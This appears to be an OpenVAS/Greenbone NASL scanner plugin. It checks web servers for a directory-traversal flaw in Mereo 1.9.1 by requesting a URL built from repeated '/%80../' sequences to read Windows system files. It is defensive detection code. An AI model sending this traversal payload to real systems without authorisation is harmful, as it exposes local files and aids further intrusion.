if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100636" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2010-05-12 19:34:03 +0200 (Wed, 12 May 2010)" );
	script_bugtraq_id( 40053 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "Mereo Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/40053" );
	script_xref( name: "URL", value: "http://www.assembla.com/wiki/show/babsJ-LFer3B3tab7jnrAJ" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web Servers" );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "Host/runs_windows" );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "Mereo is prone to a directory-traversal vulnerability because it fails
  to sufficiently sanitize user-supplied input." );
	script_tag( name: "impact", value: "Exploiting this issue will allow an attacker to view arbitrary local
  files and directories within the context of the webserver. Information
  harvested may aid in launching further attacks." );
	script_tag( name: "affected", value: "Mereo 1.9.1 is vulnerable, other versions may also be affected." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: port );
if(ContainsString( banner, "Server:" )){
	exit( 0 );
}
files = traversal_files( "windows" );
for pattern in keys( files ) {
	file = files[pattern];
	url = "/%80../%80../%80../%80../%80../%80../%80../%80../" + file;
	if(http_vuln_check( port: port, url: url, pattern: pattern )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 0 );

